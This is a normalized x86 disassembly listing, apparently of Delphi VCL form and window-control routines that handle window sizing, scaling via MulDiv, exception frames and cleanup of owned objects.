sub_478228
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_478184
mov ecx edi
mov edx esi
mov eax ebx
call sub_49635c
pop edi
pop esi
pop ebx
retn
sub_478250
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x26c ]
xor edx edx
push ebp
push sub_4782bc
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_494a34
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xe4 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4782c3
mov eax [ ebp - 0x4 ]
dec [ eax + 0x26c ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_4782c3
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x270 ]
mov [ ebp - 0x5 ] al
mov eax [ ebp - 0x4 ]
mov [ eax + 0x270 ] 0x1
xor eax eax
push ebp
push sub_47830b
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_477ea0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478312
mov eax [ ebp - 0x4 ]
movzx edx [ ebp - 0x5 ]
mov [ eax + 0x270 ] dl
retn
sub_478312
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x260 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_477f20
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x264 ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_478388
push ebx
push esi
push edi
add esp 0xffffffec
mov [ esp ] edx
mov ebx eax
mov eax ebx
call sub_48d878
mov edx [ ebx + 0x260 ]
mov edx [ edx + 0x10 ]
cmp eax edx
jge r-xdata
mov esi eax
mov esi edx
jmp r-xdata
mov edi edx
mov edi eax
jmp r-xdata
mov eax ebx
call sub_48d8bc
mov edx [ ebx + 0x264 ]
mov edx [ edx + 0x10 ]
cmp eax edx
jle r-xdata
push edi
lea eax [ esp + 0x8 ]
push eax
mov eax [ ebx + 0x264 ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ ebx + 0x260 ]
mov eax [ eax + 0xc ]
neg eax
mov ecx esi
call sub_432b40
mov eax [ esp ]
lea esi [ esp + 0x4 ]
mov edi eax
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov edx [ esp ]
mov eax ebx
call sub_4912a8
add esp 0x14
pop edi
pop esi
pop ebx
retn
sub_478408
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_478469
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ r-xdata ]
call sub_448388
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_495ac4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478470
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_478498
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_477c44
mov eax [ r-xdata ]
mov [ esi + 0x50 ] eax
mov dl 0x1
mov eax esi
call sub_477ec4
mov edx 0xb9
mov eax esi
call sub_48d5f8
mov edx 0x29
mov eax esi
call sub_48d62c
mov [ esi + 0x278 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax esi
pop esi
pop ebx
retn
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_478504
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_477cf8
movzx eax [ ebx + 0x278 ]
mov eax [ eax * 4 + rw-data ]
or [ esi + 0x4 ] eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
pop esi
pop ebx
retn
cmp [ ebx + 0x1e1 ] 0x0
je r-xdata
cmp [ ebx + 0x278 ] 0x1
jne r-xdata
and [ esi + 0x4 ] 0xff7fffff
or [ esi + 0x8 ] 0x200
sub_478574
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov edx esi
mov eax ebx
call sub_495d94
pop esi
pop ebx
retn
cmp [ ebx + 0x278 ] 0x1
jne r-xdata
mov eax ebx
call sub_492ec4
sub_4785a4
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
test dl dl
je r-xdata
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_478723
push [ fs : eax ]
mov [ fs : eax ] esp
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_477c44
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
push ebp
push sub_478701
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ rw-data ]
movzx eax [ eax + 0xcd ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x360 ] al
test al al
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax [ ebp - 0x4 ]
mov si 0xffa6
call sub_4483f8
mov edx [ ebp - 0x4 ]
mov edx [ edx ]
mov eax edx
cmp eax [ r-xdata ]
je r-xdata
mov eax [ rw-data ]
mov [ eax + 0xcd ] 0x0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478708
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x374 ] 0x1
xor eax eax
push ebp
push sub_4786c9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_424324
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x374 ] 0xfe
retn
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_448088
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x11
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c88
call sub_448c38
sub_47874c
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x369 ] 0x0
jne r-xdata
test [ ebx + 0x374 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xe8 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb0
call sub_4483f8
and [ ebx + 0x374 ] 0xdf
sub_478784
push ebx
push esi
mov ebx eax
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_47ea14
xor edx edx
mov eax ebx
call sub_47ea50
mov edx 0x140
mov eax ebx
call sub_48d5f8
mov edx 0xf0
mov eax ebx
call sub_48d62c
mov dl 0x1
mov eax [ r-xdata ]
call sub_472fb4
mov esi eax
mov [ ebx + 0x298 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x298 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebx + 0x298 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_479258
mov [ ebx + 0x288 ] 0x2
mov dl 0x1
mov eax [ r-xdata ]
call sub_46e0ac
mov esi eax
mov [ ebx + 0x290 ] esi
mov edx ebx
mov eax esi
call sub_48c730
movzx eax [ r-xdata ]
mov [ ebx + 0x280 ] al
mov [ ebx + 0x281 ] 0x2
mov [ ebx + 0x283 ] 0x0
mov [ ebx + 0x289 ] 0x3
mov [ ebx + 0x29c ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x2b0 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_483ebc
mov esi eax
mov [ ebx + 0x364 ] esi
mov [ esi + 0x24 ] ebx
mov [ esi + 0x20 ] sub_47ea9c
mov [ ebx + 0x368 ] 0x0
mov [ ebx + 0x28c ] 0x1
mov edx [ ebx ]
mov eax edx
mov [ ebx + 0xa8 ] eax
mov [ ebx + 0x331 ] 0xff
xor eax eax
mov [ ebx + 0x35c ] eax
xor edx edx
mov eax ebx
call sub_4795d4
xor edx edx
mov eax ebx
call sub_48e174
xor edx edx
mov eax ebx
call sub_48e09c
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xcc ]
mov dl 0x1
mov eax ebx
call sub_496a44
mov edx ebx
mov eax [ rw-data ]
call sub_47f6f4
mov [ ebx + 0x354 ] 0xa
pop esi
pop ebx
retn
sub_478900
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_477c44
mov eax edi
mov si 0xffa6
call sub_4483f8
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_448694
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_4486ec
pop [ fs : 0x0 ]
add esp 0xc
sub_478948
push ebx
mov ebx eax
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_42e534
mov eax [ rw-data ]
mov eax [ eax + 0x74 ]
mov edx ebx
call sub_4248a0
xor edx edx
mov eax ebx
call sub_42834c
cmp [ ebx + 0x2b8 ] 0x0
je r-xdata
cmp [ ebx + 0x287 ] 0x1
je r-xdata
mov eax [ ebx + 0x2b8 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x369 ] 0x0
jne r-xdata
mov eax ebx
call sub_47df84
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xec ]
sub_4789b0
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_44873c
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_480ea8
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor ecx ecx
push ebp
push sub_478ac8
push [ fs : ecx ]
mov [ fs : ecx ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x369 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_47c3d4
mov eax [ ebp - 0x4 ]
call sub_496c14
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xec ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_47f72c
mov eax [ ebp - 0x4 ]
add eax 0x290
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov eax [ ebp - 0x4 ]
add eax 0x298
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov eax [ ebp - 0x4 ]
add eax 0x334
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov eax [ ebp - 0x4 ]
add eax 0x340
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
mov eax [ ebp - 0x4 ]
add eax 0x364
mov edx [ eax ]
xor ecx ecx
mov [ eax ] ecx
mov eax edx
call sub_4481b0
movzx edx [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_477cbc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_478acf
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xb4 ]
sub_478ae4
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x322 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x374 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_478b25
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x324 ]
call [ ebx + 0x320 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4795d4
sub_478b2a
mov eax [ ebp - 0x4 ]
mov si 0xffa7
call sub_4483f8
test al al
jne r-xdata
call sub_448cfc
mov eax [ ebp - 0x4 ]
test [ eax + 0x374 ] 0x2
je r-xdata
call sub_448ca8
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4795d4
sub_478b60
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x32a ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_478ba1
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x32c ]
call [ ebx + 0x328 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_478bc0
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_490858
cmp [ ebx + 0x278 ] 0x0
je r-xdata
cmp [ ebx + 0x59 ] 0x0
je r-xdata
cmp [ ebx + 0x30 ] 0x0
je r-xdata
mov eax [ ebx + 0x364 ]
call sub_483fc4
test al al
je r-xdata
mov eax [ rw-data ]
mov edx [ eax + 0x38 ]
mov eax [ ebx + 0x64 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax ebx
call sub_48e09c
mov edi [ ebx + 0x278 ]
xor eax eax
mov [ ebx + 0x278 ] eax
mov eax edi
mov si 0xffb6
call sub_4483f8
test al al
je r-xdata
test [ ebx + 0x1c ] 0x10
jne r-xdata
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_47ea9c
mov edx edi
mov eax ebx
call sub_47bed4
sub_478c44
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_492594
mov eax ebx
sub al 0x1
jb r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
je r-xdata
cmp [ edi + 0x2a8 ] 0x0
je r-xdata
cmp [ edi + 0x2a0 ] 0x0
jne r-xdata
cmp esi [ edi + 0x2a0 ]
jne r-xdata
jmp r-xdata
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x2a8 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x2ac ]
jne r-xdata
xor edx edx
mov eax edi
call sub_47ab08
mov eax esi
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
cmp esi [ edi + 0x2b4 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_47aae0
mov edx esi
mov eax edi
call sub_47ab08
jmp r-xdata
cmp esi [ edi + 0x33c ]
jne r-xdata
xor edx edx
mov eax edi
call sub_47aabc
mov eax [ edi + 0x334 ]
test eax eax
je r-xdata
xor edx edx
mov eax edi
call sub_47ae34
mov eax [ edi + 0x340 ]
test eax eax
je r-xdata
mov edx esi
call sub_424744
test eax eax
jl r-xdata
cmp esi [ edi + 0x348 ]
jne r-xdata
mov edx esi
call sub_424744
test eax eax
jl r-xdata
mov edx eax
mov eax [ edi + 0x334 ]
call sub_4245dc
mov edx edi
mov eax esi
call sub_42e594
cmp esi [ edi + 0x2cc ]
jne r-xdata
xor eax eax
mov [ edi + 0x348 ] eax
mov edx eax
mov eax [ edi + 0x340 ]
call sub_4245dc
mov edx edi
mov eax esi
call sub_42e594
xor eax eax
mov [ edi + 0x2cc ] eax
sub_478d80
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_492038
xor edx edx
push ebp
push sub_478ffe
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2bc ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2c0 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x2c4 ] edx
xor ebx ebx
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_44813c
cmp eax [ r-xdata ]
jne r-xdata
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_491230
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2b0 ] 0x0
je r-xdata
movzx eax [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x369 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2bc ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2c4 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c0 ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_48d890
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
movzx edx [ r-xdata ]
mov [ eax + 0x88 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_48d8d4
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2b0 ] eax
mov eax [ ebp - 0x4 ]
call sub_4791a4
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_48f2b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_479005
mov eax [ ebp - 0x4 ]
call sub_492040
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_478184
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_496290
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_478184
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c4 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_48d9b8
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c4 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_496290
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2b0 ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x64 ]
mov eax esi
call sub_46d830
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_46d838
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2bc ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2bc ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x88 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c0 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x2c0 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x258 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x258 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c4 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
sub_47900d
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_492b80
push 0x0
push 0x0
push ebx
push sub_47914c
movzx ecx [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_479118
push ebx
push sub_479130
movzx ecx [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_4791c3
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
nop
nop
nop
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_478184
mov ecx edi
mov edx esi
mov eax ebx
call sub_496290
mov eax ebx
call sub_4792b4
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x64 ]
mov eax ebp
call sub_46d920
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_46d93c
mov ecx edi
mov edx esi
mov eax ebx
call sub_48d9b8
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_48d8bc
mov ebp eax
push edi
push esi
mov eax ebx
call sub_48d878
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_47956c
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_4795a0
sub_479258
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_496868
call sub_4769b0
test eax eax
je r-xdata
mov eax ebx
call sub_496c14
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x80 ]
cmp [ ebx + 0x281 ] 0x3
je r-xdata
mov eax ebx
call sub_47c548
push eax
push 0x1
push 0x80
mov eax ebx
call sub_496868
push eax
call SendMessageW
pop ebx
retn
sub_4792ec
push ebx
mov ebx eax
mov eax ebx
call sub_47a89c
test al al
je r-xdata
xor eax eax
pop ebx
retn
movzx eax [ ebx + 0x281 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x268 ]
je r-xdata
sub_479380
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_496868
call sub_4769b0
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_4969d0
pop esi
pop ebx
retn
push 0x0
push 0x0
push 0x0
push 0x0
push esi
call SetRect
push 0xffffffec
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
push eax
cmp [ ebx + 0x2a0 ] 0x0
setne al
neg al
sbb eax eax
push eax
push 0xfffffff0
mov eax ebx
call sub_496868
push eax
call GetWindowLongW
push eax
push esi
call AdjustWindowRectEx
mov eax [ ebx + 0x4c ]
sub eax [ esi + 0xc ]
add eax [ esi + 0x4 ]
push eax
mov eax [ ebx + 0x48 ]
sub eax [ esi + 0x8 ]
add eax [ esi ]
push eax
push 0x0
push 0x0
push esi
call SetRect
pop esi
pop ebx
retn
sub_479408
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi edx
mov ebx eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
mov edx esi
mov eax ebx
call sub_496ef8
cmp ebx esi
jne r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn 0x8
mov eax ebx
call sub_42e8d0
dec eax
test eax eax
jl r-xdata
inc eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0x0
inc [ ebp - 0x4 ]
dec [ ebp - 0x8 ]
jne r-xdata
mov edx edi
mov eax [ ebp + 0xc ]
call [ ebp + 0x8 ]
mov edx [ ebp - 0x4 ]
mov eax ebx
call sub_42e8a4
mov edi eax
mov eax edi
mov si 0xfff1
call sub_4483f8
test al al
jne r-xdata
sub_47948c
push ebx
mov ebx eax
cmp [ ebx + 0x90 ] 0x0
jne r-xdata
xor eax eax
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
mov ecx [ ebx ]
mov edx ecx
cmp edx eax
sete al
pop ebx
retn
sub_4794b0
push ebx
push esi
push edi
push ebp
add esp 0xfffffff4
mov [ esp + 0x4 ] ecx
mov [ esp ] edx
mov ebp eax
mov eax [ esp ]
mov edx [ r-xdata ]
call sub_448388
test al al
je r-xdata
mov eax ebp
call sub_492534
sub [ esp + 0x4 ] eax
mov [ esp + 0x8 ] 0xffffffff
mov eax ebp
call sub_42e8d0
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
mov ecx [ esp + 0x4 ]
mov edx [ esp ]
mov eax ebp
call sub_496f40
jmp r-xdata
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
inc edi
dec ebx
jne r-xdata
inc [ esp + 0x8 ]
mov eax [ esp + 0x8 ]
cmp eax [ esp + 0x4 ]
jne r-xdata
mov edx edi
mov eax ebp
call sub_42e8a4
mov si 0xfff1
call sub_4483f8
test al al
jne r-xdata
mov edx edi
mov eax [ esp ]
call sub_42e8e0
jmp r-xdata
sub_479544
push ebx
mov ebx eax
cmp dl [ ebx + 0x60 ]
je r-xdata
pop ebx
retn
mov eax ebx
call sub_48e198
cmp [ ebx + 0x30 ] 0x0
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax ebx
call sub_48f2b0
sub_47956c
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_48d890
pop ebx
retn
mov [ ebx + 0x2bc ] edx
movzx eax [ r-xdata ]
or al [ ebx + 0x88 ]
mov [ ebx + 0x88 ] al
pop ebx
retn
sub_4795a0
push ebx
mov ebx eax
test [ ebx + 0x54 ] 0x8
je r-xdata
mov eax ebx
call sub_48d8d4
pop ebx
retn
mov [ ebx + 0x2c0 ] edx
movzx eax [ r-xdata ]
or al [ ebx + 0x88 ]
mov [ ebx + 0x88 ] al
pop ebx
retn
sub_4795d4
push ebx
push esi
mov ebx edx
mov esi eax
test [ esi + 0x374 ] 0x1
je r-xdata
test bl bl
je r-xdata
test bl bl
je r-xdata
mov edx ebx
mov eax esi
call sub_48deb0
cmp bl [ esi + 0x57 ]
je r-xdata
and [ esi + 0x374 ] 0xfd
pop esi
pop ebx
retn
or [ esi + 0x374 ] 0x2
jmp r-xdata
mov eax esi
call sub_47afd4
pop esi
pop ebx
retn
sub_479618
push ebp
mov ebp esp
push 0x0
xor edx edx
push ebp
push sub_479677
push [ fs : edx ]
mov [ fs : edx ] esp
cmp [ eax + 0x287 ] 0x1
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_47967e
lea eax [ ebp - 0x4 ]
call j_sub_449348
retn
cmp [ eax + 0x57 ] 0x0
je r-xdata
cmp [ eax + 0x30 ] 0x0
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_44be28
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_439c4c
call sub_448c38
sub_479688
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x30 ]
cmp ebx eax
je r-xdata
pop ebx
pop ecx
pop ecx
pop ebp
retn
cmp ebx [ ebp - 0x4 ]
je r-xdata
test eax eax
sete [ ebp - 0x5 ]
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
push ebp
push sub_479738
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
